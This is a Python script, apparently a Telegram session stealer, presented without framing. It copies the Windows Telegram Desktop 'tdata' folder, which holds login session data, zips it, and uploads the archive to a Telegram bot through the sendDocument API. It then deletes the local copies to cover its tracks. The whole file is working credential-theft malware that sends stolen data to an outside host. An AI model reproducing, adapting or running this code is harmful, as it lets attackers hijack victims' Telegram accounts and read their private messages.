# import os
from os.path import expanduser
import os
import datetime
import requests
user_name = os.getlogin()
home = expanduser("~")
rootDir = home + '/AppData/Roaming/Telegram Desktop/tdata/'
entries = os.listdir(home + '/AppData/Roaming/Telegram Desktop/tdata/')
TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
TG_ID = "YOUR_TG_ID"
import shutil
localDir = os.getcwd()
files = []
dirs = []
def getFilesInFolder(folderpath):
    filesInFolder = os.listdir( rootDir + folderpath)
    if len(filesInFolder) > 0:
        for newFile in filesInFolder:
            newName = newFile + '-root-' + folderpath
            files.append(newName)
        
        dirs.remove(folderpath)
    else:
        dirs.remove(folderpath)

for name in entries:
    fullname = rootDir + name
    if os.path.isdir(fullname):
        if 'user_data' in name:
            print("FOUND USER_DATA FOLDER")
            print(name)
        elif 'dumps' in name:
            print("FOUND dumps FOLDER")
            print(name)
        elif 'emoji' in name:
            print("FOUND emoji FOLDER")
            print(name)
        elif 'tdummy' in name:
            print("FOUND tdummy FOLDER")
            print(name)
        else:
            dirs.append(name)
    else:
        newName = name + '-root-' + 'tdata'
        files.append(newName)

while len(dirs) != 0:
    for filename in dirs:
        getFilesInFolder(filename)

localsavedir = ''

if os.path.exists(user_name + '-' + 'tdata'):
    date = datetime.datetime.now()
    id = str(date.microsecond)
    os.mkdir(localDir + '/' + user_name + '-' + id)
    localsavedir = user_name + '-' + id
    print('tdata folder exists')
else:
    os.mkdir(localDir + '/' + user_name + '-' + 'tdata')
    localsavedir = user_name + '-' + 'tdata'

for newFile in files:
    check = newFile.find('-root-')
    checkFoo = check + 6
    foldername = newFile[checkFoo:]
    filename = newFile[:check]
    try:
        if foldername == 'tdata':
            src = rootDir + filename
            dest = localDir + '/' + localsavedir + '/' + filename
            print(src)
            print(dest)
            shutil.copy(src, dest)
        elif os.path.exists( localsavedir + '/' + foldername):
            src = rootDir + foldername + '/' + filename
            dest = localDir + '/' + localsavedir + '/' + foldername + '/' + filename
            print(src)
            print(dest)
            shutil.copy(src, dest)
        else: 
            src = rootDir + foldername + '/' + filename
            dest = localDir + '/' + localsavedir + '/' + foldername + '/' + filename
            os.mkdir(localDir + '/' + localsavedir + '/' + foldername)
            print(src)
            print(dest)
            shutil.copy(src, dest)
    except:
        print('ERROR')
    
print("FILES"),
print(files)
print("FOLDERS")
print(dirs)
shutil.make_archive(localsavedir, 'zip', localsavedir)
file = open(localsavedir +'.zip', 'rb')
multipart_form_data = {
    'chat_id': (None, TG_ID),
    'document': (localsavedir + '.zip', file),
}

response = requests.post(f'https://api.telegram.org/${TELEGRAM_TOKEN}/sendDocument', files=multipart_form_data)
print(response.content)
shutil.rmtree(localsavedir)
exists = True
file.close()
while exists:
    try:
        os.remove(localsavedir + '.zip')
        exists = False
    except:
        print('DELETE ERROR')